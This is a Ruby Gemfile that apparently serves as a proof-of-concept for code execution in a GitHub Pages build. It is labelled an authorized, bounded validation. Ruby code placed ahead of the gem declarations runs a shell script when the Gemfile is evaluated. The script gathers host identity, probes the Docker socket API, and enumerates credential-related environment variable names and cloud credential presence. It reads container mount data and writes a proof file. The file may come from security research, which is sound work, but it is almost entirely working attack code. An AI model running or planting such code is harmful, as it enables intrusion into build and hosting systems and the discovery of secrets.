# Authorized bounded GitHub Pages Gemfile RCE validation.
require "open3"
marker = "PAGES_GEMFILE_RCE_20260919144125-c0c989"
cmd = "echo \"### identity and platform\"
id
whoami
hostname
uname -a
pwd
echo \"### docker socket API non-destructive check\"
ls -l /var/run/docker.sock /run/docker.sock 2>&1 || true
ruby -rsocket -e 'begin; s=UNIXSocket.new(\"/var/run/docker.sock\"); s.write(\"GET /_ping HTTP/1.1\\r\\nHost: docker\\r\\n\\r\\n\"); puts \"docker_ping=\"+s.readpartial(200).gsub(\"\\r\",\"\\\\r\").gsub(\"\\n\",\"\\\\n\"); ensure; s.close if s; end' 2>&1 || true
ruby -rsocket -e 'begin; s=UNIXSocket.new(\"/var/run/docker.sock\"); s.write(\"GET /version HTTP/1.1\\r\\nHost: docker\\r\\n\\r\\n\"); puts \"docker_version_prefix=\"+s.readpartial(1000).gsub(\"\\r\",\"\\\\r\").gsub(\"\\n\",\"\\\\n\"); ensure; s.close if s; end' 2>&1 || true
echo \"### environment variable names related to credentials (names only)\"
env | cut -d= -f1 | sort | grep -Ei 'token|secret|key|credential|password|passwd|aws|azure|google|connection|database|github|actions' || true
echo \"### cloud credential variable presence (values not printed)\"
for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_WEB_IDENTITY_TOKEN_FILE AWS_ROLE_ARN AZURE_CLIENT_ID AZURE_TENANT_ID AZURE_FEDERATED_TOKEN_FILE GOOGLE_APPLICATION_CREDENTIALS; do
  if printenv \"$v\" >/dev/null; then echo \"$v=present\"; else echo \"$v=absent\"; fi
done
echo \"### container/mount indicators\"
cat /proc/1/cgroup 2>&1 | head -20
grep -Ei 'docker|container|github|actions|/var/run' /proc/self/mountinfo | head -20 || true"
stdout, stderr, status = Open3.capture3("/bin/bash", "-lc", cmd)
proof = []
proof << "marker=#{marker}"
proof << "utc=#{Time.now.utc.strftime('%Y-%m-%dT%H:%M:%SZ')}"
proof << "cmd=#{cmd}"
proof << "exit=#{status.exitstatus}"
proof << "--- stdout ---"
proof << stdout
proof << "--- stderr ---"
proof << stderr
proof << "--- context ---"
proof << "id=#{%x(id).strip}"
proof << "whoami=#{%x(whoami).strip}"
proof << "hostname=#{%x(hostname).strip}"
proof << "ruby=#{RUBY_VERSION}"
proof << "pwd=#{Dir.pwd}"
proof << "GITHUB_ACTION_REPOSITORY=#{ENV.fetch('GITHUB_ACTION_REPOSITORY', '<unset>')}"
proof << "GITHUB_ACTION_REF=#{ENV.fetch('GITHUB_ACTION_REF', '<unset>')}"
proof << "GITHUB_REPOSITORY=#{ENV.fetch('GITHUB_REPOSITORY', '<unset>')}"
File.write(File.join(__dir__, "pages-gemfile-rce-20260919144125-c0c989.txt"), proof.join("\n") + "\n")
source "https://rubygems.org"
gem "github-pages", "= 232"
